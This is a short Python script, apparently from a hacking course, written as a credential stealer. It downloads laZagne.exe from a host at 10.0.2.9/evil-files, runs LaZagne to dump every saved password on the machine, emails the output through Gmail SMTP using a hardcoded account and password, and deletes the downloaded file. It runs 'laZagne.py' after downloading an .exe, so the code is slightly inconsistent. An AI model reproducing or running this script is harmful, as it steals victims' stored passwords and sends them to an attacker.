#!/usr/bin/env Python

import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    filename = url.split("/")[-1]
    print(filename)
    with open(filename, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://10.0.2.9/evil-files/laZagne.exe")
result = subprocess.check_output("laZagne.py all", shell=True)
send_mail("datasource226@gmail.com", "MGDZS@ejtMVywFf5VDoUvjJ75M@&!t%bn", result)
os.remove("laZagne.exe")